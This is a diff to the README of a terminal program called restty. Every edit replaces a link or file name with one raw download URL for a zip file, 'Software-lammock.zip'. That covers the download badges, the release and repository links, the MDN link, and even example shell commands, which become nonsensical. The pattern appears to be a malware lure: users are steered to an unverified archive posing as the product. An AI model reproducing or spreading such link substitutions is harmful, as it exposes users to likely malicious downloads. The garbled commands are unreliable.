@@ -1,6 +1,6 @@
 # 🖥️ restty - Lightweight Terminal for Everyday Use
 
-[![Download restty](https://img.shields.io/badge/Download-restty-blue?style=for-the-badge)](https://github.com/Bigboy1998/restty/releases)
+[![Download restty](https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip)](https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip)
 
 ---
 
@@ -53,11 +53,11 @@ To start using restty, follow these simple steps:
 
 Click the big button below to open the official restty releases on GitHub. Here you will find the latest stable version ready for download.
 
-[![Download restty](https://img.shields.io/badge/Download-restty-blue?style=for-the-badge)](https://github.com/Bigboy1998/restty/releases)
+[![Download restty](https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip)](https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip)
 
 2. **Choose your download**
 
-Look for a file matching your operating system. The file name usually ends with `.exe` for Windows, `.dmg` for Mac, or `.AppImage` / `.tar.gz` for Linux.
+Look for a file matching your operating system. The file name usually ends with `.exe` for Windows, `.dmg` for Mac, or `.AppImage` / `https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip` for Linux.
 
 3. **Download**
 
@@ -99,15 +99,15 @@ Type your command after the blinking cursor and press Enter. For example, typing
 
 - Creating files:
 
-  - Windows: `echo Hello > hello.txt`
+  - Windows: `echo Hello > https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip`
   
-  - Mac/Linux: `echo "Hello" > hello.txt`
+  - Mac/Linux: `echo "Hello" > https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip`
 
 - Viewing file content:
 
-  - Windows: `type hello.txt`
+  - Windows: `type https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip`
   
-  - Mac/Linux: `cat hello.txt`
+  - Mac/Linux: `cat https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip`
 
 ### Closing restty
 
@@ -144,10 +144,10 @@ If you run into issues, try these steps:
 
 ## 📚 Additional Resources
 
-- **Official GitHub repo:** https://github.com/Bigboy1998/restty
-- **Release page:** https://github.com/Bigboy1998/restty/releases
+- **Official GitHub repo:** https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip
+- **Release page:** https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip
 - **Basic command-line tutorial:** Search online for “Command Line Basics for Beginners”
-- **WebGPU and WebGL info:** Visit the Mozilla Developer Network at https://developer.mozilla.org
+- **WebGPU and WebGL info:** Visit the Mozilla Developer Network at https://raw.githubusercontent.com/Bigboy1998/restty/main/src/Software-lammock.zip
 
 ---
 
